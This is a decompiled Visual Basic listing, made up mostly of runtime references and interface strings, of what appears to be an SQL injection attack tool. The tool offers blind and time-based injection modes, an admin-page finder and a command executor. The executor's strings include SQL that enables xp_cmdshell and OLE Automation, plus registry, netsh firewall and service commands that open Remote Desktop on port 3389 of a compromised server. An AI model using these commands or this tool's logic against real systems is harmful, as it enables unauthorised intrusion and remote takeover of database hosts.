'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: "&"
'N  * ref: InstrRev(
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: "&"
'N  * ref: InstrRev(
'N  * ref: IIf(
'N  * ref: __vbaI4Var
'N  * ref: "="
'N  * ref: __vbaInStrVar
'N  * ref: Mid(
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: Right(
'N  * ref: __vbaHresultCheckObj
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "WARNING: Injection type is set to integer but input value is not integer this may fake analyze results!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: "You have selected POST method but didn't enter any post data!"
'N  * ref: "  Stop  "
'N  * ref: __vbaHresultCheckObj
'N  * ref: "stop"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarForNext
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: "Blind"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: "time based"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: "Analyzing target"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Target: "
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: "Target: "
'N  * ref: vbTab
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: "Auto Detect"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCopy
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCopy
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCopy
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_170
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCopy
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Filter:"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Start Row: 1"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: "'"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaI2I4
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: Subr_159
'N  * ref: "Job Canceled!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Analyze"
'N  * ref: "go"
'N  * ref: "Stop"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Canceling..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Analyze"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "go"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Pause"
'N  * ref: "Resume"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "go"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: " (Paused...)"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: DoEvents
'N  * ref: "Pause"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "pause"
'N  * ref: "Resume"
'N  * ref: "Pause"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "pause"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: " (Paused...)"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub Toolbar2_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "Execute"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaObjSet
'N  * ref: "Executing command"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: "  Stop  "
'N  * ref: __vbaHresultCheckObj
'N  * ref: "stop"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Executing command: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: Subr_179
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: "Job Canceled!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Execute"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "go"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "xp_exec"
'N  * ref: __vbaVarTstEq
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE"
'N  * ref: __vbaStrCopy
'N  * ref: "os_ex"
'N  * ref: __vbaVarTstEq
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "RD"
'N  * ref: __vbaVarTstEq
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: "Stop prevoius job!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "Executing command"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "  Stop  "
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "stop"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "Enabling Remote Desktop service"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCopy
'N  * ref: "reg add " & """" & "hklm\system\currentcontrolset\control\terminal server" & """" & " /v " & """" & "allowTSConnections" & """" & " /t REG_DWORD /d 0x1 /f"
'N  * ref: Subr_179
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "reg add " & """" & "hklm\system\currentcontrolset\control\terminal server" & """" & " /v " & """" & "fDenyTSConnections" & """" & " /t REG_DWORD /d 0x0 /f"
'N  * ref: Subr_179
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "netsh firewall add portopening TCP 3389 " & """" & "Remote Desktop" & """"
'N  * ref: Subr_179
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "netsh advfirewall firewall add rule name=" & """" & "Remote Desktop" & """" & " dir=in action=allow protocol=TCP localport=3389"
'N  * ref: Subr_179
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "sc config TermService start= auto"
'N  * ref: Subr_179
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "net start Termservice"
'N  * ref: Subr_179
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "Job Canceled!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Execute"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "go"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVarList
'N  * ref: "Stop"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Canceling..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Execute"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "go"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
End Sub
 
'Sub DoQuery()
'N  * ref: __vbaExceptHandler
'N  * ref: "Stop prevoius job!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "Executing query"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "  Stop  "
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "stop"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "Query: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_181
'N  * ref: __vbaVarMove
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: "Job Canceled!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Execute"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "go"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'End Sub
 
Sub Toolbar3_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstEq
'N  * ref: "Execute"
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: "Stop"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Canceling..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Execute"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "go"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
End Sub
 
Sub Toolbar4_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "Start"
'N  * ref: __vbaVarTstEq
'N  * ref: "  Stop  "
'N  * ref: __vbaHresultCheckObj
'N  * ref: "stop"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: Right(
'N  * ref: "/"
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: "/"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: "Finding admin page: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: "Initializing..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "\admins.txt"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: FileLen(
'N  * ref: Space(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "\admins.txt"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaFileOpen
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaGet3
'N  * ref: __vbaFileClose
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: ","
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaRedimVar
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: "%EXT%"
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaRedimPreserveVar
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaStrVarVal
'N  * ref: "%EXT%"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaVarIndexStore
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaRedimPreserveVar
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarIndexStore
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaR8Str
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaRedim
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarMove
'N  * ref: Subr_135
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarMove
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Timer
'N  * ref: __vbaFpR8
'N  * ref: __vbaFpR8
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Timer
'N  * ref: __vbaFpR8
'N  * ref: __vbaFpR8
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaFpR8
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Timer
'N  * ref: __vbaFpI4
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Timer
'N  * ref: __vbaFpI4
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarForNext
'N  * ref: DoEvents
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarForNext
'N  * ref: "Job Canceled!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Job Finished"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "  Start  "
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "go"
'N  * ref: "Stop"
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Canceling..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStrList
